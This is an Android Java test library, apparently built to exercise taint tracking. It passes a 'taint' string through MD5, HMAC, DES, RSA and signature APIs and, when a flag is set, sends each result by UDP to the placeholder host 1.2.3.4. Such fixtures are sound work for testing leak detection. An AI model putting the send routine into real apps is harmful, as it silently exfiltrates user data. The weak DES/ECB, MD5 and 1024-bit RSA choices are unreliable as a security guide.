package rolevax.testsecuritylib;

import android.util.Log;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.*;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.Mac;
import javax.crypto.SecretKey;

/**
 * Created by gfp on 12/7/15.
 */
public class TestSecLib {
    public static void test(String taint, boolean leak) {
        if (leak) {
            try {
                socket = new DatagramSocket();
            } catch (Exception e) {
                Log.e("wtx", "exception when making socket");
            }
        }

        try {
            Log.i("start", "message digest");
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(taint.getBytes());
            byte[] digest = messageDigest.digest();
            Log.i("haha", new String(digest));
            if (leak) {
                send(digest);
            }
        } catch (NoSuchAlgorithmException e) {
            Log.e("wtx", "no MD% algorithm");
        }

        try {
            Log.i("start", "MAC");
            KeyGenerator keyGen = KeyGenerator.getInstance("HmacMD5");
            Mac mac = Mac.getInstance("HmacMD5");
            SecretKey MD5key = keyGen.generateKey();
            mac.init(MD5key);
            mac.update(taint.getBytes());
            byte[] macBytes = mac.doFinal();
            Log.i("haha", new String(macBytes));
            if (leak)
                send(macBytes);
        } catch (NoSuchAlgorithmException e) {
            Log.e("wtx", "no HmacHD5 algorithm");
        } catch (InvalidKeyException e) {
            Log.e("wtx", "invalid key???");
        }

        try {
            Log.i("start", "symmetric encryption");
            KeyGenerator keyGen = KeyGenerator.getInstance("DES");
            keyGen.init(56);
            Key key = keyGen.generateKey();
            Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
            System.out.println( "\n" + cipher.getProvider().getInfo());
            cipher.init(Cipher.ENCRYPT_MODE, key);
            byte[] cipherText = cipher.doFinal(taint.getBytes());
            Log.i("haha", new String(cipherText));
            if (leak)
                send(cipherText);

            cipher.init(Cipher.DECRYPT_MODE, key);
            byte[] newPlainText = cipher.doFinal(cipherText);
            Log.i("haha", new String(newPlainText));
            if (leak)
                send(newPlainText);
        } catch (Exception e) {
            Log.e("wtx", "exception in symmetric key encryption");
        }

        try {
            Log.i("start", "public key encryption");
            KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
            keyGen.initialize(1024);
            KeyPair key = keyGen.generateKeyPair();
            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key.getPublic());
            byte[] cipherText = cipher.doFinal(taint.getBytes());
            Log.i("haha", new String(cipherText));
            if (leak)
                send(cipherText);

            cipher.init(Cipher.DECRYPT_MODE, key.getPrivate());
            byte[] newPlainText = cipher.doFinal(cipherText);
            Log.i("haha", new String(newPlainText));
            if (leak)
                send(newPlainText);
        } catch (Exception e) {
            Log.e("wtx", "exception in public key encryption");
        }

        try {
            Log.i("start", "digital signature");
            KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
            keyGen.initialize(1024);

            KeyPair key = keyGen.generateKeyPair();

            Signature sig = Signature.getInstance("MD5WithRSA");
            sig.initSign(key.getPrivate());
            sig.update(taint.getBytes());
            byte[] signature = sig.sign();
            Log.i("haha", new String(signature));
            if (leak)
                send(signature);

            sig.initVerify(key.getPublic());
            sig.update(taint.getBytes());

            if (sig.verify(signature))
                Log.i("haha", "signature verified");
        } catch (Exception e) {
            Log.e("wtx", "exception in digital signature");
        }
    }

    private static void send(final byte[] data) {
        new Thread() {
            @Override
            public void run() {
                try {
                    InetAddress address = InetAddress.getByName("1.2.3.4");
                    DatagramPacket packet = new DatagramPacket(data, data.length,
                            address, 4445);
                    socket.send(packet);
                    Log.i("haha", "sent to Internet");
                } catch (Exception e) {
                    Log.e("wtx", "exception when sending");
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static DatagramSocket socket;
}
